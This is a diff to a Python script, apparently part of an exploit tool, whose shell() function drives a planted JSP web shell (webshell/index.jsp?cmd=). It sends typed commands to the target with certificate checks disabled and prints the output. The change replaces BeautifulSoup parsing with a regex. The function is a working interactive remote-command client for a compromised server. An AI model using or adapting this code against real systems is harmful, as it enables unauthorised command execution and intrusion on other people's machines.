@@ -1,9 +1,9 @@
 import requests
 import base64
 import os
-from bs4 import BeautifulSoup
 import time
 import argparse
+import re
 
 def check_url(url): 
     check = url[-1] 
@@ -17,19 +17,15 @@ def shell(url):
     url = url + "webshell/index.jsp?cmd="
     while True:
         try:
-            requests.packages.urllib3.disable_warnings() 
+            requests.packages.urllib3.disable_warnings()
             p_shell = input("Shell: ")
             urls = url + p_shell
             
             print(urls)
             sr = requests.get(urls,verify=False)
-            
-            soup = BeautifulSoup(sr.content, 'html5lib') 
-            output = soup.find_all('pre') 
-            for i in output: 
-                x = i.getText() 
-                print(x)
-                
+            search = sr.text
+            match = re.findall("<pre>(.*)</pre>",search) 
+            print(match[0].replace("</br>","\n")) 
 
         except KeyboardInterrupt:
             print("Bye Bye!")
